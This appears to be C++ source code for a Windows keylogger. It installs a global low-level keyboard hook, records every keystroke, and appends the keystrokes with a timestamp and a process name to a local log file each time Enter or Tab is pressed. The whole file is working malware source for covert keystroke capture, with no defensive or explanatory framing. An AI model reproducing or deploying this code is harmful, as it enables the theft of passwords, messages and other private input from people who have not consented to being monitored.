#include <iostream>
#include "keyboard/keyboard.h"


HHOOK keyboardHook;
auto keyboardMap = createKeyboardMap();


std::vector<std::string> keyBuffer;

void flush(){
    std::ofstream myfile("../keylog.txt", std::ios::out | std::ios::app);
    if (myfile.is_open())
    {
        std::time_t logTime = system_clock::to_time_t(system_clock::now());
        myfile << std::ctime(&logTime) << "> ";

        myfile << getProcName(getCurrentPID()) << ": ";

        for (int i = 0; i < keyBuffer.size(); i++)
        {
            myfile << keyBuffer.at(i) << ' ';
        }

        myfile.flush();
        myfile.close();
    } else {
        throw std::runtime_error("Failed to open file");
    }

    keyBuffer.clear();
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *pKeyStruct = (KBDLLHOOKSTRUCT *)lParam;
        
        keyBuffer.push_back(keyboardMap[pKeyStruct->vkCode]);
        if ((pKeyStruct->vkCode == '\n' || pKeyStruct->vkCode == '\t' || pKeyStruct->vkCode == '\r') && keyBuffer.size() > 0)
        {
            keyBuffer.pop_back();
            flush();
        } else if (pKeyStruct->vkCode == 0x1B) {
            exit(0);
        }
    }

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

int main(int, char**){
    
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), NULL);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);

    return 0;
}
